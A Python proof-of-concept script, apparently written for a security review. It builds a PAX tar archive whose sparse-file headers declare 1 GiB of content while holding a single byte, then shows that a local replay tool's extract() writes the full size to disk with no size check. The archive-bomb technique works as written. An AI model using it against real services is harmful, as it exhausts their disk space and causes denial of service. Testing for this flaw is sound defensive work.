#!/usr/bin/env python3
"""What replay's extract() does with the same PAX sparse member: it writes the
declared size out to disk (disk fill before any server-side check)."""
import io
import os
import shutil
import sys
import tarfile
import time

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
import probe_archive as P  # noqa: E402
import importlib.util

spec = importlib.util.spec_from_file_location("kr", os.path.join(HERE, "kama-live-replay.py"))
kr = importlib.util.module_from_spec(spec)
spec.loader.exec_module(kr)

DECLARED = 1 << 30                      # 1 GiB keeps the probe cheap; the real field is unbounded
p = P.path("extract-bomb.tgz")
with tarfile.open(p, "w:gz", format=tarfile.PAX_FORMAT) as tf:
    ti = tarfile.TarInfo(P.MEMBER)
    ti.size = 1
    ti.pax_headers = {"GNU.sparse.map": "0,1", "GNU.sparse.size": str(DECLARED)}
    tf.addfile(ti, io.BytesIO(b"A"))
tree = P.path("extract-bomb-tree")
shutil.rmtree(tree, ignore_errors=True)
os.makedirs(tree)
t0 = time.monotonic()
kr.extract(p, tree)
out = os.path.join(tree, P.MEMBER)
print(f"archive_bytes={os.path.getsize(p)} declared={DECLARED} on_disk={os.path.getsize(out)} "
      f"seconds={time.monotonic()-t0:.2f} (extract() has no size check)")
shutil.rmtree(tree, ignore_errors=True)
